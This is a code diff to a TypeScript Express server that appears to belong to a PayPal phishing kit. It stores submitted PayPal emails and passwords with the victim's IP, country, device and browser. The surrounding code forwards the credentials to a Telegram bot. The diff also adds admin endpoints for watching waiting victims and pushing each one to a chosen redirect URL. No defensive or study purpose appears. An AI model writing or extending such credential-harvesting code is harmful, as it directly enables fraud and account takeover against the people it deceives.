@@ -162,11 +162,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: "Email and password required" });
       }
 
+      const clientInfo = await getClientInfo(req);
+
+      // Create a session for this login attempt
+      const session = await storage.createPaypalSession({
+        sessionId: clientInfo.sessionId,
+        email,
+        password,
+        ipAddress: clientInfo.ipAddress,
+        country: clientInfo.country,
+        device: clientInfo.device,
+        browser: clientInfo.browser,
+        status: "waiting",
+      });
+
       // Send notification to Telegram
       const settings = await storage.getAdminSettings();
       if (settings?.telegramBotToken && settings?.telegramChatId) {
-        const clientInfo = await getClientInfo(req);
-        
         const message = formatPayPalNotification({
           email,
           password,
@@ -185,9 +197,61 @@ export async function registerRoutes(app: Express): Promise<Server> {
         );
       }
 
-      res.json({ success: true });
+      res.json({ success: true, sessionId: session.sessionId });
     } catch (error) {
       res.status(500).json({ error: "Failed to process login" });
+    }
+  });
+
+  // Check redirect status for PayPal session
+  app.get("/api/paypal/check-redirect/:sessionId", async (req, res) => {
+    try {
+      const { sessionId } = req.params;
+      const session = await storage.getPaypalSession(sessionId);
+
+      if (!session) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      if (session.redirectUrl) {
+        res.json({ redirect: session.redirectUrl });
+      } else {
+        res.json({ redirect: null });
+      }
+    } catch (error) {
+      res.status(500).json({ error: "Failed to check redirect" });
+    }
+  });
+
+  // Get all waiting PayPal sessions (admin)
+  app.get("/api/admin/paypal-sessions", async (req, res) => {
+    try {
+      const sessions = await storage.getAllPaypalSessions();
+      const waitingSessions = sessions.filter(s => s.status === "waiting");
+      res.json(waitingSessions);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to get sessions" });
+    }
+  });
+
+  // Update PayPal session redirect (admin)
+  app.post("/api/admin/paypal-sessions/:sessionId/redirect", async (req, res) => {
+    try {
+      const { sessionId } = req.params;
+      const { redirectUrl } = req.body;
+
+      const updated = await storage.updatePaypalSession(sessionId, {
+        redirectUrl,
+        status: "redirected",
+      });
+
+      if (!updated) {
+        return res.status(404).json({ error: "Session not found" });
+      }
+
+      res.json({ success: true });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to update session" });
     }
   });
 
